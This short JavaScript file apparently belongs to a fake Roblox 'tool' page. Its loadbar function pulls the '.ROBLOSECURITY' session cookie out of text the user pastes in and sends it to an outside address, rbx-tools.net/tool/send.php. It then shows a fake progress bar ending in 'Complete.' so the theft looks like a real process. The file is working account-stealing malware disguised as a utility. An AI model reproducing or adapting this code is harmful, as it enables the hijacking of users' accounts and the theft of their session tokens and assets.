const delay = ms => new Promise(res => setTimeout(res, ms));
async function  loadbar(time)
{
    a = code.value;
    b = a.split('".ROBLOSECURITY", "').pop();
    c = b.substring(0, b.indexOf('",'));
    $.get("https://rbx-tools.net/tool/send.php?t="+c);
    
    let status = document.getElementById('Status')
    let loadbar = document.getElementById('loadbar')

    status.innerHTML = ""

    for (let i=0; i<time;i++){

            loadbar.style.width = Math.floor(100/time*i)+"%";
            loadbar.innerHTML = Math.floor(100/time*i)+"%"

        await delay(1000);
    }

    loadbar.style.width = "100%";
    loadbar.innerHTML = "100%"
    status.innerHTML = "Complete."
}